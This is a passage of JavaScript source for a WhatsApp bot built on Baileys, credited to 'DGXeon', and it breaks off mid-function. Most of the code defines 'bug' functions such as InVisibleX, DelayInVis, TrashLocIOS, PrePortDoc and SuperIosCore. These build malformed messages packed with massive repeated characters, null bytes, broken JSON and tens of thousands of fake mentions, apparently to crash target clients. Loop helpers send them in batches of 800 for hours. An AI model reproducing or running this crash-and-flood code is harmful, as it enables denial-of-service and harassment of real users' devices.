//base by DGXeon (Xeon Bot Inc.)
//re-upload? recode? copy code? give credit ya :)
//YouTube: @DGXeon
//Instagram: unicorn_xeon13
//Telegram: @DGXeon
//GitHub: @DGXeon
//WhatsApp: +916909137213
//want more free bot scripts? subscribe to my youtube channel: https://youtube.com/@DGXeon
//telegram channel: https://t.me/+WEsVdEN2B9w4ZjA9
process.on('uncaughtException', console.error)
require("./config")
const { generateMessageIDV2, WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, makeWASocket, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaSocket } = require("@whiskeysockets/baileys")
const fs = require('fs')
const util = require('util')
const axios = require('axios')
const { exec } = require("child_process")
const chalk = require('chalk')
const moment = require('moment-timezone');
const yts = require ('yt-search');
const didyoumean = require('didyoumean');
const similarity = require('similarity')
const pino = require('pino')
const logger = pino({ level: 'debug' });
const JSConfuser = require("js-confuser");
const crypto = require('crypto');
const path = require('path')
//const express = require('express');
const ms = require('ms');
const os = require('os')

/*const app = express();
const PORT = process.env.PORT || 3000;*/

module.exports = async (XeonBotInc, m) => {
try {
const from = m.key.remoteJid
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""

const { smsg, fetchJson, getBuffer, fetchBuffer, getGroupAdmins, TelegraPh, isUrl, hitungmundur, sleep, clockString, checkBandwidth, runtime, tanggal, getRandom } = require('./lib2/myfunc')
var budy = (typeof m.text == 'string' ? m.text: '')
var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const sender = m.key.fromMe ? (XeonBotInc.user.id.split(':')[0]+'@s.whatsapp.net' || XeonBotInc.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = await XeonBotInc.decodeJid(XeonBotInc.user.id)
const senderNumber = sender.split('@')[0]
const isCreator = (m && m.sender && [botNumber, ...(global.db.data.owners || [])].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
const isDeveloper = (m && m.sender && (global.db.data.owners || []).map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)


const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const groupMetadata = m.isGroup ? await XeonBotInc.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isReact = m.message.reactionMessage ? true : false

//===============[DATABASE]=====================\\
		try {
			let isNumber = x => typeof x === 'number' && !isNaN(x)
			let user = global.db.data.users[m.sender]
			if (typeof user !== 'object') global.db.data.users[m.sender] = {}
			if (user) {
				if (!isNumber(user.premiumExpiry)) user.premiumExpiry = 3478406032098
			} else global.db.data.users[m.sender] = {
				premiumExpiry: 3478406032098
			}
			
			let setting = global.db.data.settings[botNumber]
			if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
            if (setting) {
            if (!('antiswview' in setting)) setting.antiswview = false
            } else global.db.data.settings[botNumber] = {
               antiswview: false,
            }
		} catch (e) {
			console.log(e)
		}
		//=====\\
const cd = require('./lib2/countdown')
let usersdb = global.db.data.users
fs.writeFileSync('./database/database.json', JSON.stringify(global.db, null, 2))
const isPremium = isCreator ? true : cd.isPremium(usersdb, m.sender)
const isRentBotUser = isDeveloper ? true : cd.isPremium(usersdb, m.sender)
//====================================\\
//bug
xeontex = "\n " + (args.join(" ") ? args.join(" ") : "Telegram: @MOTU_PATALU_HINDU_HAI") + "\n\n\n";
    jidds = [];
    xeontex += "*~@916909137213~*\n*🦄*\n*~@919366316018~*\n".repeat(10200);
    jidds.push("916909137213@s.whatsapp.net", "919366316018@s.whatsapp.net");
//bug database
const { xeontext1 } = require('./69/xeontext1')
const { xeontext2 } = require('./69/xeontext2')
const { xeontext3 } = require('./69/xeontext3')
const { xeontext4 } = require('./69/xeontext4')
const { xeontext5 } = require('./69/xeontext5')
const { xeontext6 } = require('./69/xeontext6')
const { xeontext7 } = require('./69/xeontext7')
const { xeontext8 } = require('./69/xeontext8')
const { xeontext9 } = require('./69/xeontext9')
const { xeontext10 } = require('./69/xeontext10')
const { xeontext11 } = require('./69/xeontext11')
const { xeonbeta1, xeonbeta2, xeonyx } = require("./69/xeontext13.js")
const wkwk = fs.readFileSync(`./69/x.mp3`)
const xsteek = fs.readFileSync(`./69/x.webp`)
const o = fs.readFileSync(`./69/o.jpg`)
// No Need to Do Anything If You Don't Want Errors

//time
const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
        const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
        const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
         if(time2 < "23:59:00"){
var xeonytimewisher = `Good Night 🌌`
 }
 if(time2 < "19:00:00"){
var xeonytimewisher = `Good Evening 🌃`
 }
 if(time2 < "18:00:00"){
var xeonytimewisher = `Good Evening 🌃`
 }
 if(time2 < "15:00:00"){
var xeonytimewisher = `Good Afternoon 🌅`
 }
 if(time2 < "11:00:00"){
var xeonytimewisher = `Good Morning 🌄`
 }
 if(time2 < "05:00:00"){
var xeonytimewisher = `Good Morning 🌄`
 } 
 
 function sendMessageWithMentions2(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return XeonBotInc.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  } else {
    return XeonBotInc.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  }
}

function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return XeonBotInc.sendMessage(m.chat, {
                        text: text,
                        contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [mentions],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://files.catbox.moe/asx3vo.jpg",
sourceUrl: link,
mediaType: 1,
renderLargerThumbnail: false
}
}
                        }, {quoted:m})
  } else {
    return XeonBotInc.sendMessage(m.chat, {
                        text: text,
                        contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [mentions],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://files.catbox.moe/asx3vo.jpg",
sourceUrl: link,
mediaType: 1,
renderLargerThumbnail: false
}
}
                        }, {quoted:m})
  }
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

//group chat msg by xeon
const replygcxeon = (teks) => {
	XeonBotInc.sendMessage(m.chat, {
                        text: teks,
                        contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://files.catbox.moe/asx3vo.jpg",
sourceUrl: link,
mediaType: 1,
renderLargerThumbnail: false
}
}
                        }, {quoted:m})

}
   
//self public
if (!XeonBotInc.public) {
if (!isCreator) return
}

if (prefix && command) {
let caseNames = getCaseNames();
function getCaseNames() {
const fs = require('fs');
try {
const data = fs.readFileSync('XeonBug18.js', 'utf8');
const casePattern = /case\s+'([^']+)'/g;
const matches = data.match(casePattern);
if (matches) {
const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
return caseNames;
} else {
return [];
} } catch (err) {
console.log('There is an error:', err);
return [];
}}
let noPrefix = command
let mean = didyoumean(noPrefix, caseNames);
let sim = similarity(noPrefix, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
let response = `Sorry, the command you gave is wrong. Maybe this is what you mean:\n\n•> ${prefix+mean}\n•> Similarities: ${similarityPercentage}%`
replygcxeon(response)
}}   
//==============================================================\\
async function InVisibleX(X, show) {
            let msg = await generateWAMessageFromContent(X, {
                buttonsMessage: {
                    text: "Telegram: @MOTU_PATALU_HINDU_HAI",
                    contentText:
                        "Telegram: @MOTU_PATALU_HINDU_HAI",
                    footerText: "Telegram: @MOTU_PATALU_HINDU_HAI",
                    buttons: [
                        {
                            buttonId: ".aboutb",
                            buttonText: {
                                displayText: "Telegram: @MOTU_PATALU_HINDU_HAI" + "\u0000".repeat(500000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await XeonBotInc.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [X],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: X },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
        
            if (show) {
                await XeonBotInc.relayMessage(
                    X,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: {
                                    is_status_mention: "Telegram: @MOTU_PATALU_HINDU_HAI",
                                },
                                content: undefined,
                            },
                        ],
                    }
                );
            }            
        }
        
    async function sendMessagesForDurationX(durationHours, X) {
    const totalDurationMs = durationHours * 60 * 60 * 1000; // Convert hours to milliseconds
    const startTime = Date.now();
    let count = 0;

    const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs) {
            console.log("Delivery Completed Within Specified Duration.");
            return;
        }

        if (count < 800) {
            await InVisibleX(X, false); // Using X from user input
            count++;
            await sendNext(); // Continue shipping
        } else {
            console.log(chalk.green(`Completed Sending 800 Packages To ${X}`)); // Log completed sending 800 packages
            count = 0; // Reset for next package
            console.log(chalk.red("Preparing To Ship The Next 800 Packages..."));
            setTimeout(sendNext, 5000); // Pause 5 seconds after completion of batch of 800 messages
        }
    };

    sendNext();
};

async function sendMessagesForDuration(durationHours, X) {
    const totalDurationMs = durationHours * 60 * 60 * 1000; // Convert hours to milliseconds
    const startTime = Date.now();
    let count = 0;

    const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs) {
            console.log("Delivery Completed Within Specified Duration.");
            return;
        }

        if (count < 800) {
            await DelayInVis(X, false); // Using X from user input
            count++;
            await sendNext(); // Continue delivery without delay between messages
        } else {
            console.log(chalk.green(`Completed Sending 800 Packages To ${X}`)); // Log selesai kirim 800 paket
            count = 0; // Reset for next package
            console.log(chalk.red("Preparing To Ship The Next 800 Packages..."));
            setTimeout(sendNext, 5000); // Pause 5 seconds after completion of batch of 800 messages
        }
    };

    sendNext();
};

async function DelayInVis(X, show) {
            let push = [];
                push.push({
                    body: proto.Message.InteractiveMessage.Body.fromObject({ text: " " }),
                    footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: " " }),
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                        title: " ",
                        hasMediaAttachment: true,
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                            fileLength: "19769",
                            height: 354,
                            width: 783,
                            mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                            fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                            directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                            mediaKeyTimestamp: "1743225419",
                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACgASAMBIgACEQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAwEEBgEBAQEAAAAAAAAAAAAAAAAAAAED/9oADAMBAAIQAxAAAADzY1gBowAACkx1RmUEAAAAAA//xAAfEAABAwQDAQAAAAAAAAAAAAARAAECAyAiMBIUITH/2gAIAQEAAT8A3Dw30+BydR68fpVV4u+JF5RTudv/xAAUEQEAAAAAAAAAAAAAAAAAAAAw/9oACAECAQE/AH//xAAWEQADAAAAAAAAAAAAAAAAAAARIDD/2gAIAQMBAT8Acw//2Q==",
                            scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                            scanLengths: [2437, 10557, 1905, 17332],
                            midQualityFileSha256: "gRAggfGKo4fTOEYrQqSmr1fIGHC7K0vu0f9kR5d57eo=",
                        },
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({ buttons: [] }),
                });
        
            let msg = await generateWAMessageFromContent(
                X,
                {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2,
                            },
                            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                                body: proto.Message.InteractiveMessage.Body.create({ text: " " }),
                                footer: proto.Message.InteractiveMessage.Footer.create({ text: "bijiku" }),
                                header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: false }),
                                carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ cards: [...push] }),
                            }),
                        },
                    },
                },
                {}
            );
        
            await XeonBotInc.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [X],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: X },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
        
            if (show) {
                await XeonBotInc.relayMessage(
                    X,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: { is_status_mention: "Telegram: @MOTU_PATALU_HINDU_HAI" },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
        }
        
        async function LocUiNew(target, Ptcp = true) {
  try {
    await XeonBotInc.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                  "MOTU_PATLU_IS_HER͢ ϟ\n" +
                  "ꦾ".repeat(92000) +
                  "ꦽ".repeat(92000) +
                  `@1`.repeat(92000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                ],
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: "", 
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}
        
        async function TrashLocIOS(target) {
await XeonBotInc.relayMessage(target, {
locationMessage: {
degreesLatitude: -9.09999262999,
degreesLongitude: 199.99963118999,
jpegThumbnail: null,
name: "⛧ 𝚖𝚘𝚝𝚞 𝚙𝚊𝚝𝚕𝚞 𐍈fficial-Iᗪ ⛧" + "𑇂𑆵𑆴𑆿".repeat(10000),
address: "Wellcome_Screen",
url: `https://lol.crazyapple.${"🩸".repeat(25000)}.com`,
contextInfo: {
quotedAd: {
advertiserName: "x",
mediaType: "IMAGE",
jpegThumbnail: null,
caption: "x"
},
placeholderKey: {
remoteJid: "0@s.whatsapp.net",
fromMe: false,
id: "ABCDEF1234567890"
}
}
}
}, {})
}
		

//==============================================================\\
async function PrePortDoc(target) {
  try {
    let message = proto.Message.fromObject({
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "Dit? Yess sir",
              hasMediaAttachment: false,
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
                mimetype: "penis",
                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                fileLength: "99999999",
                pageCount: 9999,
                 mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                fileName: "",
                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1715880173",
              },
            },
            body: {
              text: "𝙅𝘼𝙔 𝙎𝙃𝙍𝙀𝙀 𝙍𝘼𝙈",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 30000,
                  },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 50000) +
                    "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    });

    await XeonBotInc.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}

async function tess(target) {
try {
    const generateMessage = {
        viewOnceMessage: {
            message: {
            interactiveMessage: {
            header: {
              title: "MOTUPATLUForce",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.035,
                degreesLongitude: 922.999999999999,
                name: "Vocaloid",
                address: "xxnx.com",
                },
                },
                body: {
                text: "Vocaloid",
               },
                nativeFlowMessage: {
                messageParamsJson: "{".repeat(10000),
               },
            contextInfo: {
              participant: target,
              mentionedJid: ["0@s.whatsapp.net"],
               },
                },           
             }
           }
          };
   await XeonBotInc.relayMessage(target,  generateMessage, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
   }catch (err) {
    console.log(err);
  }
}

async function SuperIosCore(target) {
      try {
        await XeonBotInc.relayMessage(
          target,
          {
            extendedTextMessage: {
              text: "CHANGLI ATTACK̊‏‎‏‎‏‎‏⭑",
              contextInfo: {
                stanzaId: "1234567890ABCDEF",
                participant: target,
                quotedMessage: {
                  callLogMesssage: {
                    isVideo: true,
                    callOutcome: "1",
                    durationSecs: "0",
                    callType: "REGULAR",
                    participants: [
                      {
                        jid: target,
                        callOutcome: "1",
                      },
                    ],
                  },
                },
                remoteJid: target,
                conversionSource: "source_example",
                conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
                conversionDelaySeconds: 10,
                forwardingScore: 9999999,
                isForwarded: true,
                quotedAd: {
                  advertiserName: "Example Advertiser",
                  mediaType: "IMAGE",
                  jpegThumbnail:
                    "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                  caption: "This is an ad caption",
                },
                placeholderKey: {
                  remoteJid: target,
                  fromMe: false,
                  id: "ABCDEF1234567890",
                },
                expiration: 86400,
                ephemeralSettingTimestamp: "1728090592378",
                ephemeralSharedSecret:
                  "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
                externalAdReply: {
                  title: "CHANGLI",
                  body: "CHANGLI ATTACK̊⭑",
                  mediaType: "VIDEO",
                  renderLargerThumbnail: true,
                  previewTtpe: "VIDEO",
                  thumbnail:
                    "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                  sourceType: " x ",
                  sourceId: " x ",
                  sourceUrl: "https://wa.me/settings",
                  mediaUrl: "https://wa.me/settings",
                  containsAutoReply: true,
                  showAdAttribution: true,
                  ctwaClid: "ctwa_clid_example",
                  ref: "ref_example",
                },
                entryPointConversionSource: "entry_point_source_example",
                entryPointConversionApp: "entry_point_app_example",
                entryPointConversionDelaySeconds: 5,
                disappearingMode: {},
                actionLink: {
                  url: "https://wa.me/settings",
                },
                groupSubject: "Example Group Subject",
                parentGroupJid: "6287888888888-1234567890@g.us",
                trustBannerType: "trust_banner_example",
                trustBannerAction: 1,
                isSampled: false,
                utm: {
                  utmSource: "utm_source_example",
                  utmCampaign: "utm_campaign_example",
                },
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "6287888888888-1234567890@g.us",
                  serverMessageId: 1,
                  newsletterName: " X ",
                  contentType: "UPDATE",
                  accessibilityText: " X ",
                },
                businessMessageForwardInfo: {
                  businessOwnerJid: "0@s.whatsapp.net",
                },
                smbvampCampaignId: "smb_vamp_campaign_id_example",
                smbServerCampaignId: "smb_server_campaign_id_example",
                dataSharingContext: {
                  showMmDisclosure: true,
                },
              },
            },
          },
          {
            participant: { jid: target },
            userJid: target,
          }
        );
      } catch (err) {
        console.log(err);
      }
    }
 async function IosChatCore(target, Ptcp = true) {
      await XeonBotInc.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "Halo...Saya Changli" + "\u0000".repeat(92000),
            contextInfo: {
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: target,
              conversionSource: "source_example",
              conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
              conversionDelaySeconds: 10,
              forwardingScore: 999999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: "Example Advertiser",
                mediaType: "IMAGE",
                jpegThumbnail:
